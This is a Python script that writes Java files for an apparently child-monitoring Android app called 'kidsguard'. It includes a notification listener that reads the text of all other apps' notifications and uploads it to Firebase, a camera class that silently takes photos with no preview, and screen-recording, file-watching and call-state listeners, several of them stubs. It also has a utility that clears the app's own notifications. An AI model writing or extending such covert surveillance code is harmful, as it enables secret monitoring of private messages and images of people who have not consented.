import os
b = "app/src/main/java/com/kidsguard/child"

files = {}

files[f"{b}/CameraCapture.java"] = """package com.kidsguard.child;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.provider.MediaStore;
import androidx.core.content.FileProvider;
import java.io.File;
import java.io.IOException;
public class CameraCapture {
    public static void takePicture(Context context) {
        File dir = context.getExternalFilesDir(null);
        if (dir == null) return;
        try {
            File file = File.createTempFile("cap_", ".jpg", dir);
            Uri uri = FileProvider.getUriForFile(context, context.getPackageName() + ".fileprovider", file);
            Intent i = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
            i.putExtra(MediaStore.EXTRA_OUTPUT, uri);
            i.addFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
            context.startActivity(i);
        } catch (IOException e) {}
    }
}
"""

files[f"{b}/NotificationCaptureService.java"] = """package com.kidsguard.child;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import org.json.JSONObject;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
public class NotificationCaptureService extends NotificationListenerService {
    private final ExecutorService io = Executors.newSingleThreadExecutor();
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null || sbn.getNotification() == null) return;
        if (sbn.getPackageName().equals(getPackageName())) return;
        io.execute(() -> {
            try {
                CharSequence t = sbn.getNotification().extras.getCharSequence("android.title");
                CharSequence tx = sbn.getNotification().extras.getCharSequence("android.text");
                JSONObject o = new JSONObject();
                o.put("app", sbn.getPackageName());
                o.put("title", t != null ? t.toString() : "");
                o.put("text", tx != null ? tx.toString() : "");
                o.put("time", sbn.getPostTime());
                FirebaseHelper.put("devices/" + LocationService.getSafeDeviceId(this) + "/notifs.json", o.toString());
            } catch (Exception e) { Log.e("Notif", "Parse fail", e); }
        });
    }
    @Override public void onDestroy() { io.shutdownNow(); super.onDestroy(); }
}
"""

files[f"{b}/BackgroundCamera.java"] = """package com.kidsguard.child;
import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.view.Surface;
import java.util.Collections;
public class BackgroundCamera {
    private CameraDevice device;
    private ImageReader reader;
    private HandlerThread thread;
    public void init(Context ctx) {
        thread = new HandlerThread("Cam"); thread.start();
        CameraManager m = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
        try { m.openCamera(m.getCameraIdList()[0], stateCb, new Handler(thread.getLooper())); }
        catch (Exception e) { Log.e("Cam", "Open fail", e); }
    }
    private final CameraDevice.StateCallback stateCb = new CameraDevice.StateCallback() {
        @Override public void onOpened(CameraDevice c) {
            device = c;
            try {
                reader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 1);
                c.createCaptureSession(Collections.singletonList(reader.getSurface()), sessionCb, new Handler(thread.getLooper()));
            } catch (Exception e) {}
        }
        @Override public void onDisconnected(CameraDevice c) { c.close(); }
        @Override public void onError(CameraDevice c, int e) { c.close(); }
    };
    private final CameraCaptureSession.StateCallback sessionCb = new CameraCaptureSession.StateCallback() {
        @Override public void onConfigured(CameraCaptureSession s) {
            try {
                CaptureRequest.Builder b = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                b.addTarget(reader.getSurface());
                s.capture(b.build(), null, null);
            } catch (Exception e) {}
        }
        @Override public void onConfigureFailed(CameraCaptureSession s) {}
    };
    public void release() {
        if (device != null) device.close();
        if (reader != null) reader.close();
        if (thread != null) thread.quitSafely();
    }
}
"""

files[f"{b}/ScreenRecorder.java"] = """package com.kidsguard.child;
import android.hardware.display.VirtualDisplay;
import android.media.projection.MediaProjection;
import android.util.Log;
public class ScreenRecorder {
    private MediaProjection proj;
    private VirtualDisplay display;
    public void start(MediaProjection p) {
        this.proj = p;
        p.registerCallback(new MediaProjection.Callback() {
            @Override public void onStop() { Log.d("Rec", "User stopped"); release(); }
        }, null);
        display = proj.createVirtualDisplay("Rec", 1080, 1920, 300, 0, null, null, null);
    }
    public void release() {
        if (display != null) display.release();
        if (proj != null) proj.stop();
    }
}
"""

files[f"{b}/PhotoWatcher.java"] = """package com.kidsguard.child;
import android.os.FileObserver;
import android.util.Log;
public class PhotoWatcher {
    private FileObserver obs;
    public void start(String path) {
        stop();
        obs = new FileObserver(path) {
            @Override public void onEvent(int e, String p) {
                if ((e & FileObserver.CREATE) != 0) Log.d("Watch", "New: " + p);
            }
        };
        obs.startWatching();
    }
    public void stop() {
        if (obs != null) { obs.stopWatching(); obs = null; }
    }
}
"""

files[f"{b}/PhoneStateMonitor.java"] = """package com.kidsguard.child;
import android.content.Context;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
public class PhoneStateMonitor {
    private TelephonyManager tm;
    private PhoneStateListener l;
    public void start(Context ctx) {
        tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        if (tm == null) return;
        l = new PhoneStateListener() { @Override public void onCallStateChanged(int s, String n) {} };
        tm.listen(l, PhoneStateListener.LISTEN_CALL_STATE);
    }
    public void stop() {
        if (tm != null && l != null) { tm.listen(l, PhoneStateListener.LISTEN_NONE); l = null; }
    }
}
"""

files[f"{b}/MovementDetector.java"] = """package com.kidsguard.child;
import android.content.Context;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
public class MovementDetector implements SensorEventListener {
    private SensorManager sm;
    public void start(Context ctx) {
        sm = (SensorManager) ctx.getSystemService(Context.SENSOR_SERVICE);
        Sensor s = sm.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);
        if (s != null) sm.registerListener(this, s, SensorManager.SENSOR_DELAY_NORMAL);
    }
    public void stop() { if (sm != null) sm.unregisterListener(this); }
    @Override public void onSensorChanged(SensorEvent e) {}
    @Override public void onAccuracyChanged(Sensor s, int a) {}
}
"""

files[f"{b}/CleanupUtility.java"] = """package com.kidsguard.child;
import android.app.NotificationManager;
import android.content.Context;
public class CleanupUtility {
    private final Context ctx;
    public CleanupUtility(Context c) { this.ctx = c.getApplicationContext(); }
    public void clearOld() {
        NotificationManager nm = (NotificationManager) ctx.getSystemService(Context.NOTIFICATION_SERVICE);
        if (nm == null) return;
        int[] ids = {1002, 2001, 3001};
        for (int id : ids) {
            if (id != 1001) nm.cancel(id);
        }
    }
}
"""

files[f"{b}/ScreenStateReceiver.java"] = """package com.kidsguard.child;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
public class ScreenStateReceiver extends BroadcastReceiver {
    public void register(Context ctx) {
        IntentFilter f = new IntentFilter();
        f.addAction(Intent.ACTION_SCREEN_ON);
        f.addAction(Intent.ACTION_SCREEN_OFF);
        ctx.registerReceiver(this, f);
    }
    public void unregister(Context ctx) { ctx.unregisterReceiver(this); }
    @Override public void onReceive(Context c, Intent i) {}
}
"""

files[f"{b}/UpdateManager.java"] = """package com.kidsguard.child;
import java.io.*;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
public class UpdateManager {
    public void extract(File zip, File dest) throws IOException {
        String destPath = dest.getCanonicalPath();
        try (ZipInputStream zis = new ZipInputStream(new FileInputStream(zip))) {
            ZipEntry e;
            while ((e = zis.getNextEntry()) != null) {
                File out = new File(dest, e.getName());
                if (!out.getCanonicalPath().startsWith(destPath + File.separator))
                    throw new IOException("Path traversal blocked");
                if (e.isDirectory()) out.mkdirs();
                else {
                    out.getParentFile().mkdirs();
                    try (FileOutputStream fos = new FileOutputStream(out)) {
                        byte[] buf = new byte[4096]; int len;
                        while ((len = zis.read(buf)) > 0) fos.write(buf, 0, len);
                    }
                }
            }
        }
    }
}
"""

for p, c in files.items():
    with open(p, "w") as f: f.write(c)
print("Chunk 5 done.")
